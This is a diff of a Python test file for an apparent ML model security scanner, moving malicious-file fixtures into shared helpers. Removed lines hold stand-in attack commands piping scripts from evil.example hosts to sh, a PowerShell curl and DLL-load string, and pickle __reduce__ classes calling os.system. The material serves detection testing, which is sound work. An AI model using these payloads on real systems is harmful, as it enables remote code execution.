@@ -2,7 +2,6 @@
 
 import bz2
 import gzip
-import importlib
 import io
 import json
 import lzma
@@ -16,7 +15,6 @@ import tempfile
 import zipfile
 from collections.abc import Callable
 from pathlib import Path
-from typing import cast
 
 import pytest
 
@@ -34,7 +32,6 @@ from modelaudit.utils.file.detection import (
     SAFETENSORS_ROUTING_HEADER_PARSE_BYTES,
 )
 from modelaudit.utils.file.filtering import _ZIP_MEMBER_SNIFF_LIMIT, should_skip_file
-from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos
 from tests.helpers import (
     create_malicious_pickle,
     create_mock_mxnet_symbol,
@@ -42,67 +39,43 @@ from tests.helpers import (
     prefix_mock_onnx_with_unknown_field,
     prefix_mock_onnx_with_unknown_group,
 )
-
-
-def _require_tf_protos() -> None:
-    if not _has_tf_protos():
-        pytest.skip("TensorFlow protobuf stubs unavailable")
+from tests.helpers.file_creators import SystemCommandPayload, write_sparse_safetensors_framing
+from tests.helpers.file_creators import (
+    build_line_broken_printable_utf8_ambiguous_binary_route as _build_line_broken_printable_utf8_ambiguous_binary_route,
+)
+from tests.helpers.file_creators import (
+    build_printable_utf8_ambiguous_binary_route as _build_printable_utf8_ambiguous_binary_route,
+)
+from tests.helpers.file_creators import corrupt_zip_member_crc as _corrupt_zip_member_crc
+from tests.helpers.file_creators import (
+    printable_unknown_proto_prefix as _printable_unknown_proto_prefix,
+)
+from tests.helpers.file_creators import (
+    write_hf_cachedir_tag as _write_hf_cachedir_tag,
+)
+from tests.helpers.file_creators import (
+    write_hf_download_metadata as _write_hf_download_metadata,
+)
+from tests.helpers.file_creators import (
+    write_malicious_cntk as _write_malicious_cntk,
+)
+from tests.helpers.file_creators import (
+    write_malicious_lightgbm as _write_malicious_lightgbm,
+)
+from tests.helpers.tensorflow import _build_malicious_tf_savedmodel, build_malicious_tf_metagraph
 
 
 def _build_malicious_tf_metagraph() -> bytes:
-    _require_tf_protos()
-    import modelaudit.protos  # noqa: F401
-
-    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
-    metagraph = meta_graph_pb2.MetaGraphDef()
-    metagraph.meta_info_def.meta_graph_version = "modelaudit_directory_route_test"
-    node = metagraph.graph_def.node.add()
-    node.name = "pyfunc_node"
-    node.op = "PyFunc"
-    node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
-    return cast(bytes, metagraph.SerializeToString())
-
-
-def _build_printable_utf8_ambiguous_binary_route() -> bytes:
-    """Build printable UTF-8 bytes that still require binary fail-closed routing."""
-    return (b'""' + ("é" * 17).encode("utf-8")) * 4097
-
-
-def _build_line_broken_printable_utf8_ambiguous_binary_route() -> bytes:
-    """Build line-broken printable UTF-8 bytes requiring binary fail-closed routing."""
-    return (b'""' + ("é" * 17).encode("utf-8") + b"\n") * 4097
-
-
-def _build_malicious_tf_savedmodel() -> bytes:
-    _require_tf_protos()
-    import modelaudit.protos  # noqa: F401
-
-    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
-    saved_model = saved_model_pb2.SavedModel()
-    saved_model.saved_model_schema_version = 1
-    metagraph = saved_model.meta_graphs.add()
-    node = metagraph.graph_def.node.add()
-    node.name = "pyfunc_node"
-    node.op = "PyFunc"
-    return cast(bytes, saved_model.SerializeToString())
+    return build_malicious_tf_metagraph("modelaudit_directory_route_test")
 
 
 def _write_sparse_oversized_safetensors_candidate(path: Path) -> None:
-    header_len = SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 1
-    with path.open("wb") as handle:
-        handle.write(struct.pack("<Q", header_len))
-        handle.write(b"{")
-        handle.truncate(8 + header_len + 1)
+    write_sparse_safetensors_framing(path, SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 1)
 
 
 def _write_minimal_safetensors(path: Path) -> None:
     metadata = b"{}"
     path.write_bytes(struct.pack("<Q", len(metadata)) + metadata)
-
-
-def _printable_unknown_proto_prefix(min_bytes: int) -> bytes:
-    field = b"z " + (b"x" * 32)
-    return field * ((min_bytes // len(field)) + 1)
 
 
 def _bert_vocab_text() -> str:
@@ -165,109 +138,23 @@ def _large_model_card_text(min_bytes: int = 3 * 1024 * 1024) -> str:
     return "\n".join(lines) + "\n"
 
 
-def _corrupt_zip_member_crc(path: Path, member_name: str) -> None:
-    """Patch a ZIP member CRC so full scanning sees a malformed entry."""
-    with zipfile.ZipFile(path) as archive:
-        info = archive.getinfo(member_name)
-        bad_crc = ((info.CRC + 1) & 0xFFFFFFFF).to_bytes(4, "little")
-        local_offset = info.header_offset
-
-    data = bytearray(path.read_bytes())
-    assert data[local_offset : local_offset + 4] == b"PK\x03\x04"
-    data[local_offset + 14 : local_offset + 18] = bad_crc
-
-    member_name_bytes = member_name.encode("utf-8")
-    central_offset = 0
-    while True:
-        central_offset = data.find(b"PK\x01\x02", central_offset)
-        assert central_offset >= 0
-        name_length = int.from_bytes(data[central_offset + 28 : central_offset + 30], "little")
-        extra_length = int.from_bytes(data[central_offset + 30 : central_offset + 32], "little")
-        comment_length = int.from_bytes(data[central_offset + 32 : central_offset + 34], "little")
-        name_start = central_offset + 46
-        name_end = name_start + name_length
-        if data[name_start:name_end] == member_name_bytes:
-            data[central_offset + 16 : central_offset + 20] = bad_crc
-            break
-        central_offset = name_end + extra_length + comment_length
-
-    path.write_bytes(data)
-
-
-def _write_hf_download_metadata(path: Path) -> None:
-    path.parent.mkdir(parents=True, exist_ok=True)
-    path.write_text(
-        "c5ee24cb16019beea0893ab7796b1df96625c6b8\n821d1aa69520101d6e0737f78a042ae25b19e5c0\n1712656091.123\n",
-        encoding="utf-8",
-    )
-
-
-def _write_hf_cachedir_tag(path: Path) -> None:
-    path.parent.mkdir(parents=True, exist_ok=True)
-    path.write_text(
-        "Signature: 8a477f597d28d172789f06886806bc55\n"
-        "# This file is a cache directory tag created by huggingface_hub.\n"
-        "# For information about cache directory tags, see:\n"
-        "#\thttps://bford.info/cachedir/\n",
-        encoding="utf-8",
-    )
-
-
-def _write_malicious_cntk(path: Path, include_structure: bool = True) -> None:
-    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
-    structure = b" CompositeFunction primitive_functions " if include_structure else b""
-    payload = b" native_user_function loadlibrary C:\\temp\\evil.dll powershell -c curl http://evil.example/p.sh "
-    path.write_bytes(prefix + structure + payload)
-
-
-def _write_malicious_lightgbm(path: Path, valid: bool = True) -> None:
-    body = "tree=0\nversion=v4\nnum_class=1\n"
-    if valid:
-        body += (
-            "num_tree_per_iteration=1\nmax_feature_idx=2\ntree_sizes=12\nnum_leaves=2\n"
-            "split_feature=0\nleaf_value=0.1 0.2\n"
-            "metadata=os.system('curl https://collector.evil.example/payload.sh | sh')\n"
-            "callback_url=https://collector.evil.example/payload.sh\n"
-        )
-    path.write_text(body, encoding="utf-8")
-
-
 class TestDirectoryFileFiltering:
     """Test directory scanning with file filtering."""
 
     def test_skip_file_types_enabled(self):
         """Test that non-model files are skipped when skip_file_types=True."""
-        with tempfile.TemporaryDirectory() as tmp_dir:
-            # Create various file types
-            (Path(tmp_dir) / "README.md").write_text("Documentation")
-            (Path(tmp_dir) / "script.py").write_text("print('hello')")
-            (Path(tmp_dir) / "style.css").write_text("body { color: red; }")
-            (Path(tmp_dir) / "model.pkl").write_bytes(pickle.dumps({"weights": [1.0]}))
-            (Path(tmp_dir) / "config.json").write_text('{"key": "value"}')
-
-            # Scan with file filtering enabled (default)
-            results = scan_model_directory_or_file(tmp_dir, skip_file_types=True)
-
-            # Should scan model files and README for security
-            assert results["files_scanned"] == 3  # model.pkl, config.json, and README.md
-            assert results["success"] is True
+        # Create various file types
+        # Scan with file filtering enabled (default)
+        # Should scan model files and README for security
+        # model.pkl, config.json, and README.md
+        _assert_directory_file_type_filter((True), (3))
 
     def test_skip_file_types_disabled(self):
         """Test that all files are scanned when skip_file_types=False."""
-        with tempfile.TemporaryDirectory() as tmp_dir:
-            # Create various file types
-            (Path(tmp_dir) / "README.md").write_text("Documentation")
-            (Path(tmp_dir) / "script.py").write_text("print('hello')")
-            (Path(tmp_dir) / "style.css").write_text("body { color: red; }")
-            (Path(tmp_dir) / "model.pkl").write_bytes(pickle.dumps({"weights": [1.0]}))
-            (Path(tmp_dir) / "config.json").write_text('{"key": "value"}')
-
-            # Scan with file filtering disabled
-            results = scan_model_directory_or_file(tmp_dir, skip_file_types=False)
-
-            # Should scan all files
-            assert results["files_scanned"] == 5
-            assert results["success"] is True
+        # Create various file types
+        # Scan with file filtering disabled
+        # Should scan all files
+        _assert_directory_file_type_filter((False), (5))
 
     def test_hidden_files_skipped(self):
         """Test that hidden files are skipped appropriately."""
@@ -392,13 +279,7 @@ class TestDirectoryFileFiltering:
         """Directory scans should not skip payloads whose content is a supported format."""
         disguised_payload = tmp_path / "payload.jpg"
 
-        class DangerousPayload:
-            def __reduce__(self) -> tuple[object, tuple[str]]:
-                import os as os_module
-
-                return (os_module.system, ("echo directory-prefilter-test",))
-
-        disguised_payload.write_bytes(pickle.dumps(DangerousPayload()))
+        disguised_payload.write_bytes(pickle.dumps(SystemCommandPayload("echo directory-prefilter-test")))
 
         results = scan_model_directory_or_file(str(tmp_path))
 
@@ -1188,16 +1069,10 @@ class TestDirectoryFileFiltering:
     ) -> None:
         """Default hidden/basename filters must not suppress supported payload content."""
 
-        class DangerousPayload:
-            def __reduce__(self) -> tuple[object, tuple[str]]:
-                import os as os_module
-
-                return (os_module.system, ("echo directory-hidden-filter-test",))
-
         safe_payload = tmp_path / "safe.pkl"
         disguised_payload = tmp_path / filename
         safe_payload.write_bytes(pickle.dumps({"safe": True}))
-        disguised_payload.write_bytes(pickle.dumps(DangerousPayload()))
+        disguised_payload.write_bytes(pickle.dumps(SystemCommandPayload("echo directory-hidden-filter-test")))
 
         results = scan_model_directory_or_file(str(tmp_path))
 
@@ -1298,15 +1173,9 @@ class TestDirectoryFileFiltering:
     def test_disguised_llamafile_zip_polyglot_preserves_nested_findings(self, tmp_path: Path) -> None:
         """A renamed executable ZIP wrapper must retain recursive member scanning."""
 
-        class DangerousPayload:
-            def __reduce__(self) -> tuple[object, tuple[str]]:
-                import os as os_module
-
-                return (os_module.system, ("echo directory-llamafile-zip-test",))
-
         payload = tmp_path / "payload.jpg"
         with zipfile.ZipFile(payload, "w") as archive:
-            archive.writestr("payload.pkl", pickle.dumps(DangerousPayload()))
+            archive.writestr("payload.pkl", pickle.dumps(SystemCommandPayload("echo directory-llamafile-zip-test")))
         payload.write_bytes(b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n" + payload.read_bytes())
 
         results = scan_model_directory_or_file(str(tmp_path))
@@ -1335,15 +1204,9 @@ class TestDirectoryFileFiltering:
     def test_executable_zip_with_out_of_window_llamafile_marker_preserves_nested_findings(self, tmp_path: Path) -> None:
         """ZIP structure must preserve coverage independently of bounded marker routing."""
 
-        class DangerousPayload:
-            def __reduce__(self) -> tuple[object, tuple[str]]:
-                import os as os_module
-
-                return (os_module.system, ("echo directory-late-marker-zip-test",))
-
         payload = tmp_path / "payload.jpg"
         with zipfile.ZipFile(payload, "w") as archive:
-            archive.writestr("payload.pkl", pickle.dumps(DangerousPayload()))
+            archive.writestr("payload.pkl", pickle.dumps(SystemCommandPayload("echo directory-late-marker-zip-test")))
         payload.write_bytes(
             b"\x7fELF"
             + b"\x00" * 60
@@ -1533,16 +1396,13 @@ class TestDirectoryFileFiltering:
         """Model-like .bin payloads in Office ZIP containers should not be hidden by the outer suffix."""
         docx_path = tmp_path / "report.docx"
 
-        class DangerousPayload:
-            def __reduce__(self) -> tuple[object, tuple[str]]:
-                import os as os_module
-
-                return (os_module.system, ("echo embedded-bin-prefilter-test",))
-
         with zipfile.ZipFile(docx_path, "w") as archive:
             archive.writestr("[Content_Types].xml", "<Types></Types>")
             archive.writestr("word/document.xml", "<w:document></w:document>")
-            archive.writestr("word/embeddings/oleObject1.bin", pickle.dumps(DangerousPayload(), protocol=4))
+            archive.writestr(
+                "word/embeddings/oleObject1.bin",
+                pickle.dumps(SystemCommandPayload("echo embedded-bin-prefilter-test"), protocol=4),
+            )
 
         results = scan_model_directory_or_file(str(tmp_path))
 
@@ -1554,18 +1414,14 @@ class TestDirectoryFileFiltering:
         """Late model payloads in Office-like ZIPs must survive bounded prefiltering."""
         docx_path = tmp_path / "late-payload.docx"
 
-        class DangerousPayload:
-            def __reduce__(self) -> tuple[object, tuple[str]]:
-                import os as os_module
-
-                return (os_module.system, ("echo late-office-prefilter-test",))
-
         with zipfile.ZipFile(docx_path, "w") as archive:
             archive.writestr("[Content_Types].xml", "<Types></Types>")
             archive.writestr("word/document.xml", "<w:document></w:document>")
             for index in range(_ZIP_MEMBER_SNIFF_LIMIT):
                 archive.writestr(f"docs/{index}.txt", "filler")
-            archive.writestr("payload.pkl", pickle.dumps(DangerousPayload(), protocol=4))
+            archive.writestr(
+                "payload.pkl", pickle.dumps(SystemCommandPayload("echo late-office-prefilter-test"), protocol=4)
+            )
 
         results = scan_model_directory_or_file(str(tmp_path))
 
@@ -2194,18 +2050,12 @@ class TestDirectoryFileFiltering:
     def test_local_download_bookkeeping_rejects_spoofed_payloads(self, tmp_path: Path, filename: str) -> None:
         """Local cache-looking paths must not skip pickle payloads."""
 
-        class DangerousPayload:
-            def __reduce__(self) -> tuple[object, tuple[str]]:
-                import os as os_module
-
-                return (os_module.system, ("echo spoofed-local-bookkeeping-test",))
-
         model_dir = tmp_path / "downloaded-model"
         model_dir.mkdir()
         (model_dir / "config.json").write_text('{"model_type":"gpt2"}')
         payload = model_dir / ".cache" / "huggingface" / "download" / filename
         payload.parent.mkdir(parents=True)
-        payload.write_bytes(pickle.dumps(DangerousPayload(), protocol=0))
+        payload.write_bytes(pickle.dumps(SystemCommandPayload("echo spoofed-local-bookkeeping-test"), protocol=0))
 
         assert _is_huggingface_cache_file(str(payload)) is False
 
@@ -2213,14 +2063,8 @@ class TestDirectoryFileFiltering:
     def test_direct_scans_do_not_skip_local_bookkeeping_filenames(self, tmp_path: Path, filename: str) -> None:
         """A malicious local file should not become trusted because of its basename."""
 
-        class DangerousPayload:
-            def __reduce__(self) -> tuple[object, tuple[str]]:
-                import os as os_module
-
-                return (os_module.system, ("echo direct-scan-bookkeeping-test",))
-
         payload = tmp_path / filename
-        payload.write_bytes(pickle.dumps(DangerousPayload()))
+        payload.write_bytes(pickle.dumps(SystemCommandPayload("echo direct-scan-bookkeeping-test")))
 
         result = scan_file(str(payload))
 
@@ -2328,3 +2172,17 @@ class TestDirectoryFileFiltering:
 
             # Duration should be reasonable (not checking exact time to avoid flakiness)
             assert "duration" in results
+
+
+def _assert_directory_file_type_filter(case_skip_file_types: bool, case_file_count: int) -> None:
+    with tempfile.TemporaryDirectory() as tmp_dir:
+        (Path(tmp_dir) / "README.md").write_text("Documentation")
+        (Path(tmp_dir) / "script.py").write_text("print('hello')")
+        (Path(tmp_dir) / "style.css").write_text("body { color: red; }")
+        (Path(tmp_dir) / "model.pkl").write_bytes(pickle.dumps({"weights": [1.0]}))
+        (Path(tmp_dir) / "config.json").write_text('{"key": "value"}')
+
+        results = scan_model_directory_or_file(tmp_dir, skip_file_types=case_skip_file_types)
+
+        assert results["files_scanned"] == case_file_count
+        assert results["success"] is True
